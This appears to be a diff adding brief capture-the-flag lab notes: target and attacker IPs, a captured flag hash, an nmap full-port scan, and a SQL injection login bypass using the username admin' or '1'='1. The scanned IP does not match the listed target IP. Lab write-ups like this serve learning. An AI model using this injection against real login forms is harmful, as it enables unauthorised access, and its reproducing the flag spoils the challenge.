@@ -1,0 +1,11 @@
+Target IP: 10.129.148.230
+
+Attacking IP: 10.10.14.130
+
+flag:
+e3d0796d002a446c0e622226f42e9672
+
+Steps:
+1. nmap -sV -p- 10.129.74.183
+2. SQL inject with username = admin' or '1'='1
+
